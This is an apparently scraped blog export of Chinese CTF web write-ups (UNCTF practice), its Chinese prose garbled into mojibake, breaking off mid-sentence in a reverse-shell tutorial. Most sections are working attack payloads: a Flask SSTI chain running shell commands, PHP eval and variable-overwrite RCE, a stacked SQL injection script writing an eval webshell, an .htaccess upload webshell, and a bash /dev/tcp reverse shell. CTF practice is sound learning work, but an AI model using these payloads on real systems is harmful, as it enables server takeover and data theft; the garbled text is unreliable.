ç»§ç»­åˆ·ï¼Œè¿˜æœ‰ä¸€äº›webæ²¡è§£å†³ easyflaskè¿›å…¥ç½‘é¡µåè®©æˆ‘ä»¬ç™»å½•adminï¼Œä½†æ˜¯å•¥éƒ½æ²¡æœ‰ï¼Œè¿™é‡Œæ‰«æå™¨åº”è¯¥æ˜¯å¯ä»¥æ‰«å‡ºæ¥çš„ï¼Œä½†æ˜¯æˆ‘ç›´æ¥çŒœè·¯ç”±çŒœå‡ºæ¥äº†â€¦â€¦ /loginè·¯ç”±ç™»å½•ï¼Œregisterè·¯ç”±æ³¨å†Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ªadminå†ç™»å½•ã€‚ å¥½åƒæ˜¯ç¯å¢ƒé—®é¢˜ï¼Œå¤ç°çš„æ—¶å€™é¡µé¢ä¸ä¼šè·³è½¬ï¼Œåº”è¯¥ä¼šæœ‰ä¸ª/secret_route_you_do_not_knowè·¯ç”±ï¼Œè¿™ä¸ªè·¯ç”±å­˜åœ¨sstiï¼Œfuzzå‘ç°&#39;%&#39;, &#39;_&#39;, &#39;eval&#39;, &#39;open&#39;, &#39;flag&#39;,in, &#39;-&#39;, &#39;class&#39;, &#39;mro&#39;, &#39;[&#39;, &#39;]&#39;, &#39;\\&quot;&#39;, &#39;\\&#39;&#39;è¢«è¿‡æ»¤ï¼Œå› æ­¤ä½¿ç”¨attrå’Œrequest.header.xnä»£æ›¿é»‘åå•ï¼Œå–å‡ºevalæ‰§è¡Œï¼Œç»•è¿‡ä¸‹åˆ’çº¿ä¸å¼•å·ï¼Œpayloadï¼š 1?guess=&#123;&#123;()|attr(request.args.class)|attr(request.args.bases)|attr(request.args.subclasses)()|attr(request.args.a)(117)|attr(request.args.b)|attr(request.args.c)|attr(request.args.d)(request.args.e)(request.args.f)|attr(request.args.g)()&#125;&#125;&amp;class=__class__&amp;bases=__base__&amp;subclasses=__subclasses__&amp;a=__getitem__&amp;b=__init__&amp;c=__globals__&amp;d=get&amp;e=popen&amp;f=cat flag.txt&amp;g=read ä¼ å…¥è·å–flag åæ¥å‘ç°è¿™é¢˜è¿˜æœ‰è€ƒflask sessionçš„ä¼ªé€ ï¼Œåº”è¯¥æ˜¯å‡ºé¢˜äººæ•°æ®åº“æ²¡å¼„å¥½å¯¼è‡´éé¢„æœŸäº†ï¼Œå…ˆçœ‹sessionï¼š 1eyJ1c2VybmFtZSI6Im1ybDY0In0.YjHmyg.GRqDKK3KExT0DN_Db_TYKi7Rf8g è¿™ä¸ªå’Œtokenæ˜¯ç±»ä¼¼çš„ä¸œè¥¿ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦çˆ†ç ´å‡ºæ¥secret_keyï¼Œå‚è€ƒä¸‹é¢è¿™ç¯‡åšå®¢ï¼šé€šè¿‡SECRET_KEYç»•è¿‡flaskçš„sessionè®¤è¯ ä½¿ç”¨flask_unsignå·¥å…·çˆ†ç ´å‡ºsecret_keyçš„å€¼ï¼Œç„¶åä¼ªé€ sessionç»•è¿‡éªŒè¯ï¼Œä»è€Œç™»å½•adminã€‚ easyphpä¸€ç‚¹éƒ½ä¸ezçš„phpå®¡è®¡ï¼Œå®¡è®¡ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263 &lt;?php$adminPassword = &#x27;d8b8caf4df69a81f2815pbcb74cd73ab&#x27;;if (!function_exists(&#x27;fuxkSQL&#x27;)) &#123; function fuxkSQL($iText) &#123; $oText = $iText; $oText = str_replace(&#x27;\\\\\\\\&#x27;, &#x27;\\\\&#x27;, $oText); $oText = str_replace(&#x27;\\&quot;&#x27;, &#x27;&quot;&#x27;, $oText); $oText = str_replace(&quot;\\&#x27;&quot;, &quot;&#x27;&quot;, $oText); $oText = str_replace(&quot;&#x27;&quot;, &quot;&#x27;&#x27;&quot;, $oText); return $oText; &#125;&#125;if (!function_exists(&#x27;getVars&#x27;)) &#123; function getVars() &#123; $totals = array_merge($_GET, $_POST); if (count($_GET)) &#123; foreach ($_GET as $key =&gt; $value) &#123; global $&#123;$key&#125;; if (is_array($value)) &#123; $temp_array = array(); foreach ($value as $key2 =&gt; $value2) &#123; if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123; $temp_array[$key2] = fuxkSQL(trim($value2)); &#125; else &#123; $temp_array[$key2] = str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, (trim($value2)))); &#125; &#125; $&#123;$key&#125; = $_GET[$key] = $temp_array; &#125; else &#123; if (function_exists(&#x27;mysql_real_escape_string&#x27;)) &#123; $&#123;$key&#125; = fuxkSQL(trim($value)); &#125; else &#123; $&#123;$key&#125; = $_GET[$key] = str_replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;, str_replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;, (trim($value)))); &#125; &#125; &#125; &#125; &#125;&#125;getVars();if (isset($source)) &#123; highlight_file(__FILE__);&#125;//åªæœ‰adminæ‰èƒ½è®¾ç½®ç¯å¢ƒå˜é‡if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123; echo &#x27;you can set config variables!!&#x27; . &#x27;&lt;/br&gt;&#x27;; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123; @eval(&quot;\\$$key&quot; . &#x27;=&quot;&#x27; . $GLOBALS[$key] . &#x27;&quot;;&#x27;); &#125; &#125;&#125; else &#123; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match(&#x27;/var\\d&#123;1,2&#125;/&#x27;, $key)) &#123; echo ($GLOBALS[$key]) . &#x27;&lt;/br&gt;&#x27;; &#125; &#125;&#125; ç›´æ¥å…ˆçœ‹ä¸»è¦éƒ¨åˆ†ï¼Œæˆ‘ä»¬å‘ç°ç¬¬ä¸€ä¸ªåŒ¹é…md5($password) === $adminPasswordï¼Œä½†æ˜¯é‚£ä¸ª$adminPasswordæ ¹æœ¬å°±ä¸æ˜¯md5ï¼Œå› æ­¤æˆ‘ä»¬è¦å¯»æ‰¾ä¸€ä¸‹å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚ 12foreach ($_GET as $key =&gt; $value) &#123; global $&#123;$key&#125;; è¿™ä¸ªåœ°æ–¹æœ‰ä¸€ä¸ªå˜é‡è¦†ç›–ï¼Œæˆ‘ä»¬å¦‚æœä¼ å…¥adminPassword=c4ca4238a0b923820dcc509a6f75849bçš„è¯å°±å¯ä»¥è¦†ç›–æ‰åŸé¢˜ç›®ä¸­çš„è¿™ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯†ç çš„md5å°±å˜æˆå¯æ§çš„äº†ã€‚ ç„¶åæ˜¯sha1ç¢°æ’ï¼Œå¼±ç±»å‹æ¯”è¾ƒç›´æ¥æ‰¾è€æœ‹å‹0eå°±å¯ä»¥äº†ï¼Œå› æ­¤è¿™é‡Œçš„payloadï¼š 1?source&amp;password=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;verif=0e1290633704 ç»§ç»­çœ‹ï¼Œè¦æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªåç§°ä¸ºvar1æˆ–è€…var2çš„å€¼ï¼Œå¹¶ä¸”å€¼çš„é•¿åº¦è¦å°äº12ã€‚è¿™é‡Œæœ‰å‡ ç§æ–¹æ³•éƒ½èƒ½è§£å†³é—®é¢˜ï¼Œphpå¤æ‚ï¼Œè¯­å¥é—­åˆç­‰ç­‰éƒ½å¯ä»¥æ„é€ å‡ºrceï¼Œpayloadï¼š 12345?source&amp;password=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;verif=0e1290633704&amp;var1=\\&quot;;$a();?&gt;&amp;a=phpinfo//è¯­å¥é—­åˆ?source&amp;password=1&amp;adminPassword=c4ca4238a0b923820dcc509a6f75849b&amp;verif=0e1290633704&amp;var1=$&#123;$a()&#125;&amp;a=phpinfo//phpå¤æ‚ phpmysqlè¿™é¢˜è¿˜æ˜¯å¤ä¹ ä¸‹å§ï¼Œå®¡è®¡ä»£ç ï¼š 123456789101112131415161718192021222324252627282930 &lt;?phpshow_source(__FILE__);echo(&quot;æ¬¢è¿æ¥åˆ°unctf2021ï¼Œhave fun&quot;.&quot;&lt;br&gt;&quot;);$db_host=$_POST[&#x27;host&#x27;];$db_user=$_POST[&#x27;user&#x27;];$db_pwd=$_POST[&#x27;pwd&#x27;];$db_port=$_POST[&#x27;port&#x27;];if($db_host==&quot;&quot;)&#123; die(&quot;æ•°æ®åº“åœ°å€ä¸èƒ½ä¸ºç©ºï¼&quot;);&#125;if(is_numeric($db_host))&#123; echo(&quot;fakeflag is /flag&quot;.&quot;&lt;br&gt;&quot;); if(preg_match(&quot;/;|\\||&amp;/is&quot;,$db_user) || preg_match(&quot;/;|\\||&amp;/is&quot;,$db_pwd) || preg_match(&quot;/;|\\||&amp;/is&quot;,$db_port))&#123; die(&quot;å˜‰ç„¶ä»Šå¤©åƒä»€ä¹ˆ&quot;); &#125; system(&quot;mysql -h $db_host -u $db_user -p $db_pwd -P $db_port --enable-local-infile&quot;);&#125;else&#123; echo(&quot;Maybe you can do someting else&quot;.&quot;&lt;br&gt;&quot;); if(!isset($db_user) || !isset($db_pwd))&#123; eval(&quot;echo new Exception(\\&quot;&lt;script&gt;alert(&#x27;å…³æ³¨å˜‰ç„¶ï¼Œé¡¿é¡¿è§£é¦‹ï¼ï¼ï¼&#x27;);&lt;/script&gt;\\&quot;);&quot;); &#125; else&#123; $db_user = str_ireplace(&quot;SplFileObject&quot;, &quot;UNCTF2021&quot;, $db_user); eval(&quot;echo new $db_user($db_pwd);&quot;); &#125;&#125; æˆ‘ä»¬é¦–å…ˆè¦å®šä½åˆ°æˆ‘ä»¬éœ€è¦çš„rceä¸Šï¼Œè¿™é‡Œèƒ½åˆ©ç”¨çš„åº”è¯¥æ˜¯æœ€åä¸€å¥ï¼Œå› æ­¤æˆ‘ä»¬å°±è¦å¯¹userä¸pwdå¤§åšæ–‡ç« ã€‚è¿™é‡Œç”¨è¯­å¥é—­åˆçš„æ–¹æ³•ï¼Œé¦–å…ˆhostæ˜¯å¿…é¡»è¦çš„ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªéæ•°å­—å°±å¯ä»¥äº†ã€‚æ¥ç€æ˜¯payloadï¼š 1host=a&amp;user=DirectoryIterator&amp;pwd=&quot;/&quot;);system(&quot;ls /&quot;);echo (&quot;1&quot; åˆ©ç”¨DirectoryIteratorä½¿è¯­å¥æˆç«‹ï¼Œå¹¶ä¸”é…åˆpwdé—­åˆè¯­å¥ï¼Œè¿™æ ·evalä¸­å°±å˜æˆäº†ï¼š 1eval(&quot;echo new DirectoryIterator(&quot;/&quot;);system(&quot;ls /&quot;);echo (&quot;1&quot;);&quot;); æ„é€ rceæˆåŠŸã€‚ åæ¥å‘ç°è¿™é¢˜è¿˜æœ‰ä¸€ç§è§£æ³•ï¼Œå¼‚å¸¸æŠ¥é”™æ‰§è¡Œrceï¼š 1host=a&amp;user=exception&amp;pwd=system(&quot;ls /&quot;) å…·ä½“åŸç†å¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡åšå®¢ï¼šè¿å¼‚å¸¸æŠ¥é”™ä¹Ÿèƒ½æ‹¿åˆ°flag? ä¿„ç½—æ–¯æ–¹å—äººå¤§æˆ˜å¥¥ç‰¹æ›¼æ¸¸æˆå…³ï¼Œæ‰¾jsï¼Œå‘ç°è¿™æ ·ä¸€ä¸²ï¼š 1234567const go = new Go();const name =&quot;blocks&quot;;const curWwwPath=window.document.location.href;const pathName=window.document.location.pathname;const pos=curWwwPath.indexOf(pathName);const localhostPath=curWwwPath.substring(0,pos);let url = `$&#123;localhostPath&#125;/$&#123;name&#125;.wasm.gz`; å‘ç°å­˜åœ¨wasmåŒ…ï¼Œä¸‹è½½ï¼Œæ‰“å¼€åæœç´¢flagï¼Œæ‰¾åˆ°htmlæ–‡æ¡£ï¼Œè¿›å…¥æ–‡æ¡£å³å¯è·å–flagã€‚ è¿™é¢˜å¥½æ°´ï¼Œå°±æ˜¯è¯´ç»™æ¸¸æˆå…³çš„jså¯»æ‰¾æä¾›äº†ä¸€ç§æ€è·¯å§ã€‚ EZ_IMAGE(misc)æœ€åè®°ä¸€é“æ‹¼å›¾é¢˜ï¼Œè¿™é¢˜ç”¨åˆ°äº†ä¸¤ä¸ªå·¥å…·ï¼šmontageå’Œgaps ä¸‹è½½é™„ä»¶åå‘ç°æ‹¿åˆ°çš„éƒ½æ˜¯åå­—ä»¥unctfå¼€å¤´çš„å›¾ç‰‡ï¼Œæ€»å…±225å¼ ï¼Œç”¨montageæŠŠå›¾ç‰‡æ•´åˆï¼š 1montage unctf*.jpg -tile 15x15 -geometry 60x60+0+0 test.jpg æ¥ç€ç”¨gapså·¥å…·è¿›è¡Œæ‹¼å›¾ä½¿å›¾ç‰‡å¤åŸï¼š 1gaps --image=test.jpg --generation=30 --population=300 --size=60 è·å¾—flagã€‚è¿™ä¸¤ä¸ªå·¥å…·å¯¹äºæ‹¼å›¾å¤„ç†æœ‰å¾ˆå¼ºå¤§çš„ä½œç”¨ï¼Œå¯ä»¥è¯´åˆæ”¶é›†åˆ°æ–°å·¥å…·äº†ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"unctfç»ƒä¹ 1","slug":"unctfç»ƒä¹ 1","date":"2022-03-14T13:03:42.000Z","updated":"2022-03-15T13:31:10.122Z","comments":true,"path":"2022/03/14/unctfç»ƒä¹ 1/","link":"","permalink":"http://example.com/2022/03/14/unctf%E7%BB%83%E4%B9%A01/","excerpt":"å‰è¨€ unctfçš„å¹³å°ä¸Šè¿˜æœ‰å‰ä¸¤å¹´çš„èµ›é¢˜ï¼Œæœ¬ç€ä¸åšç™½ä¸åšçš„ç²¾ç¥ï¼Œæˆ‘ä»¬åšä¸€ä¸‹ã€‚","text":"å‰è¨€ unctfçš„å¹³å°ä¸Šè¿˜æœ‰å‰ä¸¤å¹´çš„èµ›é¢˜ï¼Œæœ¬ç€ä¸åšç™½ä¸åšçš„ç²¾ç¥ï¼Œæˆ‘ä»¬åšä¸€ä¸‹ã€‚ ezphpå®¡è®¡æºç ï¼š 123456789101112&lt;?phpshow_source(__FILE__);$username = &quot;admin&quot;;$password = &quot;password&quot;;include(&quot;flag.php&quot;);$data = isset($_POST[&#x27;data&#x27;])? $_POST[&#x27;data&#x27;]: &quot;&quot; ;$data_unserialize = unserialize($data);if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123; echo $flag;&#125;else&#123; echo &quot;username or password error!&quot;;&#125; æˆ‘ä»¬è¦é€ä¸€ä¸ªåºåˆ—åŒ–æ•°ç»„è¿›å»ï¼Œä½†æ˜¯è¦è®©usernameçš„å€¼ä¸ºadminï¼Œpasswordçš„å€¼ä¸ºpasswordã€‚ç›´æ¥æ„é€ è¿™ä¸ªæ•°ç»„åºåˆ—åŒ–æ˜¯é€šä¸è¿‡çš„ï¼Œå› ä¸ºååºåˆ—åŒ–çš„ç»“æœå°±æ˜¯ä¸ªArrayã€‚ è¿™é‡Œè¦è¿ç”¨åˆ°å¸ƒå°”çš„trickï¼Œboolç±»å‹çš„trueè·Ÿä»»æ„å­—ç¬¦ä¸²å¯ä»¥å¼±ç±»å‹ç›¸ç­‰ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ boolç±»å‹çš„åºåˆ—åŒ–æ•°æ® ï¼Œæ— è®ºæ¯”è¾ƒçš„å€¼æ˜¯ä»€ä¹ˆï¼Œç»“æœéƒ½ä¸ºtrueã€‚ å› æ­¤æ„å»ºpayloadï¼š 1data=a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125; ä¼ å…¥å¾—åˆ°flagã€‚ L0vephpè¿›å…¥ç½‘é¡µæç¤ºæˆ‘ä»¬æŸ¥çœ‹æºç ï¼Œå³é”®è¢«banå°±f12ï¼Œå‘ç°ï¼šB4Z0-@:OCnDf, æµ‹è¯•ä¸‹æ˜¯base85ï¼Œè§£å‡ºæ¥æ˜¯get actionï¼Œä½†æ˜¯æ²¡æœ‰æºç å‡ºç°ï¼Œç»§ç»­å°è¯•ä»»æ„æ–‡ä»¶è¯»å–ï¼š 12?action=php://filter/read=string.toupper|string.rot13/resource=flag.php//base64è¢«è¿‡æ»¤äº† æºç ä¸­å‘ç°å‡ºç°äº†æ–°å†…å®¹ï¼š 123456?CUC$SYNT = &quot;HAPGS&#123;7UVF_VF_@_S4XR_S1N9&#125;&quot;;//UVAG:316R4433782R706870? rot13è§£å¯†ï¼š 123456?php$flag = &quot;unctf&#123;7his_is_@_f4ke_f1a9&#125;&quot;;//hint:316e4433782e706870? hintä¸­16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼š1nD3x.php è¿›å…¥åè¿™ä¸‹è¦è¯»æºç äº†ï¼š 123456789101112131415161718192021222324252627282930 &lt;?php error_reporting(0);show_source(__FILE__);$code=$_REQUEST[&#x27;code&#x27;];$_=array(&#x27;@&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;,&#x27;\\&amp;&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\*&#x27;,&#x27;\\`&#x27;,&#x27;\\+&#x27;,&#x27;\\-&#x27;,&#x27;\\&#x27;&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\\\\\\\&#x27;,&#x27;\\/&#x27;); $__=array(&#x27;eval&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell_exec&#x27;,&#x27;assert&#x27;,&#x27;passthru&#x27;,&#x27;array_map&#x27;,&#x27;ob_start&#x27;,&#x27;create_function&#x27;,&#x27;call_user_func&#x27;,&#x27;call_user_func_array&#x27;,&#x27;array_filter&#x27;,&#x27;proc_open&#x27;);$blacklist1 = array_merge($_);$blacklist2 = array_merge($__);if (strlen($code)&gt;16)&#123; die(&#x27;Too long&#x27;);&#125;foreach ($blacklist1 as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/m&#x27;, $code)) &#123; die(&#x27;WTF???&#x27;); &#125; &#125; foreach ($blacklist2 as $blackitem) &#123; if (preg_match (&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $code)) &#123; die(&#x27;Sry,try again&#x27;); &#125;&#125;@eval($code);?&gt; ç»•rceï¼Œé™¤äº†wafè¿˜é™åˆ¶äº†é•¿åº¦ï¼Œä¹‹å‰èƒ½ç”¨çš„æ–¹æ³•åŸºæœ¬æ˜¯ç»äº†ã€‚ä½†æ˜¯pç‰›ä¹‹å‰æœ‰ä¸€ç¯‡åšå®¢ï¼ševalé•¿åº¦é™åˆ¶ç»•è¿‡ &amp;&amp; PHP5.6æ–°ç‰¹æ€§ è¿™ç¯‡åšå®¢é‡Œä»‹ç»äº†ä¸€ä¸ªæ–¹æ³•â€”â€”æ•°ç»„å±•å¼€ï¼Œpayloadï¼š 12?1[]=test&amp;1[]=system(&#x27;ls&#x27;);&amp;2=assertPOST:code=usort(...$_GET); æœ€åå‘½ä»¤æ‰§è¡Œè·å–flagã€‚ easyunserializeå®¡è®¡æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; å¾ˆç»å…¸çš„ä¸€é“ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œæˆ‘ä»¬å®¡è®¡ä»£ç å‘ç°åªè¦è®©passwordçš„å€¼ä¸ºeasyå°±å¯ä»¥äº†ï¼Œä½†æ˜¯é¢˜ç›®è®¾ç½®äº†å˜é‡passwordçš„å€¼æ’å®šä¸º1ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½é€šè¿‡ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸çš„æ–¹å¼è®©passwordé€ƒé€¸å‡ºæ¥ã€‚ æˆ‘ä»¬å…ˆæ„é€ å¯†ç éƒ¨åˆ†éœ€è¦é€ƒé€¸çš„ååºåˆ—åŒ–ï¼š 1&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125; æ€»å…±29ä¸ªå­—ç¬¦ï¼Œæ¥ç€å‘ç°æºç ä¸­çš„æ›¿æ¢é€»è¾‘æ˜¯å¢åŠ 4ä¸ªå­—ç¬¦ï¼Œå› æ­¤éœ€è¦è¿›è¡Œ8æ¬¡æ›¿æ¢ï¼Œå¹¶ä¸”è¿˜éœ€è¦è¡¥3ä½ã€‚ä¸è¿‡ç”±äºååºåˆ—åŒ–ç»“æŸåä¸ä¼šç»§ç»­çš„åŸç†ï¼ŒæŠŠè¿™ä¸‰ä½å­—ç¬¦è¡¥åˆ°æœ€åå°±å¯ä»¥äº†ã€‚ æ„å»ºpayloadï¼Œä¼ å…¥è·å–flagï¼š 1challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;ook checkin-sqlè¿™é¢˜åšçš„éƒ½éº»äº†ï¼Œçœ‹äº†wpæ‰æ‡‚ã€‚é¦–å…ˆè¿™é‡Œæ˜¯å•å¼•å·sqlï¼Œå¹¶ä¸”è¿‡æ»¤äº†ä¸€ä¼—å‡½æ•°å¯¼è‡´å¸¸ç”¨æ³¨å…¥æ‰‹æ®µå¤±æ•ˆã€‚é¢˜ç›®æç¤ºæˆ‘ä»¬flagä¸åœ¨æ•°æ®åº“ä¸­ï¼Œé‚£å¾ˆæœ‰å¯èƒ½å°±æ˜¯æ–‡ä»¶å†™å…¥äº†ï¼Œä½†æ˜¯æˆ‘è¯•å›¾ç›´æ¥å†™é©¬å‘ç°å†™ä¸è¿›å»ã€‚ ç„¶åå°±æ­‡äº†ï¼Œçœ‹wpå‘ç°è¦åˆ©ç”¨åˆ°mysqlçš„å‚¨å­˜è¿‡ç¨‹è¿›è¡Œå†™å…¥ï¼Œå…ˆæ”¾ä¸¤ä¸ªåœ°å€åœ¨è¿™ï¼šMySQL å­˜å‚¨è¿‡ç¨‹ | èœé¸Ÿæ•™ç¨‹MySQLå­˜å‚¨è¿‡ç¨‹ | åšå®¢å›­ payloadï¼š 1234567891011121314151617&lt;?php$a = &quot;1&#x27;; create procedure `mrl64`(out string text(1024), in hex text(1024)) BEGIN SET string = hex; END; ;#&quot;;echo urlencode($a).&quot;\\n&quot;;$b = &quot;1&#x27;; call `mrl64`(@decoded, 0x73656c65637420273c3f706870206576616c28245f504f53545b226d726c3634225d293b203f3e2720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f7368656c6c2e706870223b); prepare payload from @decoded; execute payload; ;#&quot;;echo urlencode($b);?&gt;//select &#x27;&lt;?php eval($_POST[&quot;mrl64&quot;]); ?&gt;&#x27; into outfile &quot;/var/www/html/shell.php&quot;; æ¥ç€å†™å…¥å°±å¯ä»¥äº†ï¼Œexp: 1234567891011121314151617181920import requests url = &quot;http://844ce818-1804-499f-b859-ca599c2805c5.node1.hackingfor.fun/&quot;payload1 = &quot;1&#x27;%3B%0D%0A%20%20%20%20create%20procedure%20%60mrl64%60(out%20string%20text(1024),%20in%20hex%20text(1024))%0D%0A%20%20%20%20BEGIN%0D%0A%20%20%20%20%20%20%20%20SET%20string%20%3D%20hex%3B%0D%0A%20%20%20%20END%3B%0D%0A%20%20%20%20%3B%23&quot;//ä¼ å…¥mysqlä¼ å…¥è¿‡ç¨‹éƒ¨åˆ†payload2 = &quot;1&#x27;%3B%0D%0A%20%20%20%20call%20%60mrl64%60(%40decoded,%200x73656c65637420273c3f706870206576616c28245f504f53545b226d726c3634225d293b203f3e2720696e746f206f757466696c6520222f7661722f7777772f68746d6c2f7368656c6c2e706870223b)%3B%0D%0A%20%20%20%20prepare%20payload%20from%20%40decoded%3B%0D%0A%20%20%20%20execute%20payload%3B%0D%0A%20%20%20%20%3B%23&quot;//å†™å…¥shell.phpï¼Œå¯†ç mrl64 data = &#123; &quot;mrl64&quot;:&quot;system(&#x27;cat /fffllaagg&#x27;);&quot;&#125; requests.get(url=url+&quot;?inject=&quot;+payload1)requests.get(url=url+&quot;?inject=&quot;+payload2) ans = requests.post(url+&quot;shell.php&quot;,data=data)print(ans.text) è·‘è„šæœ¬å°±å¯ä»¥å¾—åˆ°flagã€‚ babywriteè¿™ä¸ªæ˜¯2021é‚£æ¬¡çš„é¢˜ï¼Œå½“æ—¶å¤ªèœäº†æ²¡åšå‡ºæ¥ï¼Œè¿™é‡Œå°±å¤ç°ä¸‹ã€‚ å®¡è®¡ä»£ç ï¼š 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);$sandbox = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);if (!is_dir($sandbox)) &#123; mkdir($sandbox);&#125;if (isset($_GET[&#x27;filename&#x27;]) &amp;&amp; isset($_GET[&#x27;content&#x27;])) &#123; $filename = $_GET[&#x27;filename&#x27;]; $content = $_GET[&#x27;content&#x27;]; if (preg_match_all(&quot;/ph|\\.\\.|\\//i&quot;, $filename) || strlen($filename) &gt; 10) &#123; die(&quot;No way!&quot;); &#125; if (preg_match_all(&quot;/&lt;\\?|ph/&quot;, $content)) &#123; die(&quot;No way!&quot;); &#125; $filename = $sandbox . &quot;/&quot; . $filename; @file_put_contents($filename, $content); echo $filename;&#125; å¾ˆç»å…¸çš„å†™å…¥ï¼Œå¾ˆç²—æš´çš„wafï¼Œå¾ˆå‘é„™çš„é™åˆ¶é•¿åº¦ã€‚é¦–å…ˆå‘ç°phpæ–‡ä»¶æ˜¯ä¸èƒ½ç›´æ¥ä¸Šä¼ çš„ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åªèƒ½ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œé‚£ä¸Šä¼ å›¾ç‰‡é©¬è‡ªç„¶å°±æƒ³åˆ°è¦ç”¨åˆ°.htaccessã€‚ å½“æ—¶æ˜¯çœŸçš„èœï¼Œå±…ç„¶è¿æ•°ç»„ç»•è¿‡æ­£åˆ™åŒ¹é…éƒ½ä¸çŸ¥é“ï¼Œç„¶åå°±å¡åœ¨è¿™äº†åŠå¤©æ­»æ´»åšä¸å‡ºæ¥ï¼Œç°åœ¨æ‡‚äº†æ‰€ä»¥å°±ç®€å•äº†ã€‚ æˆ‘ä»¬ä¼ å…¥ï¼š 1?filename=.htaccess&amp;content[]=AddType application/x-httpd-php .png ç„¶åä¼ å…¥shellï¼š 1?filename=1.png&amp;content[]=&lt;?php @eval($_POST[&#x27;mrl64&#x27;]); æœ€åç›´æ¥rceå°±å¯ä»¥äº†ï¼š 1mrl64=system(&#x27;cat /flag&#x27;);","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"æ€»ç»“åå¼¹shell","slug":"æ€»ç»“åå¼¹shell","date":"2022-03-13T07:45:23.000Z","updated":"2022-03-13T08:51:57.933Z","comments":true,"path":"2022/03/13/æ€»ç»“åå¼¹shell/","link":"","permalink":"http://example.com/2022/03/13/%E6%80%BB%E7%BB%93%E5%8F%8D%E5%BC%B9shell/","excerpt":"å‰è¨€ å½“é¢å¯¹æ— å›æ˜¾rceæˆ–è€…ç³»ç»Ÿå‡½æ•°è¢«é™åˆ¶æ—¶ç­‰ç­‰æƒ…å†µï¼Œåå¼¹shellæ˜¯ä¸€ä¸ªè§£å†³é—®é¢˜çš„å¥½é€‰æ‹©ï¼Œå› æ­¤è¿™ç¯‡åšå®¢ä¼šç®€å•ä»‹ç»åå¼¹shellçš„åŸç†ä»¥åŠæ€»ç»“ä¸€äº›åå¼¹shellçš„æ–¹æ³•","text":"å‰è¨€ å½“é¢å¯¹æ— å›æ˜¾rceæˆ–è€…ç³»ç»Ÿå‡½æ•°è¢«é™åˆ¶æ—¶ç­‰ç­‰æƒ…å†µï¼Œåå¼¹shellæ˜¯ä¸€ä¸ªè§£å†³é—®é¢˜çš„å¥½é€‰æ‹©ï¼Œå› æ­¤è¿™ç¯‡åšå®¢ä¼šç®€å•ä»‹ç»åå¼¹shellçš„åŸç†ä»¥åŠæ€»ç»“ä¸€äº›åå¼¹shellçš„æ–¹æ³• å¸¸è§çš„åå¼¹shellbashåå¼¹å‘½ä»¤ï¼š 1bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1 ä¾æ¬¡è§£é‡Šï¼š bash -iä»£è¡¨ç€æ‰“å¼€ä¸€ä¸ªäº¤äº’çš„bash &gt;è¡¨ç¤ºé‡å®šå‘ï¼Œç›®æ ‡æ˜¯/dev/tcp/æ”»å‡»ä¸»æœºip/port &amp;è¡¨ç¤ºåå°è¿è¡Œï¼Œå¦‚æœä¸åŠ 